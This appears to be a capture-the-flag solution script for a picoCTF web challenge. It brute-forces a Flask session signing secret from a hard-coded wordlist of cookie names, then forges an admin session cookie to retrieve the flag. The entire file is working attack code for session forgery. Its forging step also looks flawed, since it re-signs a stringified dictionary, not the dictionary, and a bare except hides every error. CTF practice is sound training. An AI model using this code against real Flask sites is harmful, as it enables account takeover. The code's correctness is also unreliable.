#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests
import re
import json

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
	r = requests.post('http://mercury.picoctf.net:6259/search')
	res = r.headers['Set-Cookie']
	p = re.compile('session=([a-zA-Z0-9.-]+)')
	cookie = p.findall(res)[0]
	print(cookie)
	for i in cookie_names:
		try:
			decodedDict = decodeFlaskCookie(i, cookie)
			rpl = str(decodedDict).replace('blank', 'admin')
			print(rpl)
			payload = encodeFlaskCookie(i, rpl)
			print(payload)
			headers = {'Cookie': 'session=' + payload}
			print(headers)
			r = requests.get('http://mercury.picoctf.net:6259/display', headers=headers)
			p = re.compile('picoCTF\{.*\}')
			flag = p.findall(r.text)[0]
			print(flag)
		except:
			continue

	